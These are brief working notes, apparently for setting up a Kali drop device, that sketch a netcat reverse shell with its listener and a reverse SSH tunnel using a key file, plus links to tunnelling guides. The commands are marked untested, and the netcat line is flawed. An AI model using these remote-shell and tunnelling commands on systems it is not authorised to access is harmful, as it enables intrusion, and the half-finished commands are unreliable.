
##Netcat sucks but would work...

/bin/sh | nc TARGET IP 80 #This is the IP of the Kali device
nc -lvp 80 # Run this listener on Kali

##SSH is better.

Autossh - https://linux.die.net/man/1/autossh
Reverse SSH Tunneling Tutorial - https://www.howtoforge.com/reverse-ssh-tunneling 
SSH Keys instead of passwords - https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server 

## SSH With Port Forward using certificate based authentication - woot.

#this needs work, I need to think on the logic.
ssh -i "bsides-keypair.pem" root@hostname -R 22:172.16.0.1:22 -v

Attacker > SSH To Control Server - Port 22
Kali > SSH To Control Server - Accepts connections on 22

SSH Control Server forwards requests port 8000 to Kali device.
- How does it know the device for transport?? Experiment.
-- -R 8000:localhost:8000 I think will do it.

Testing required.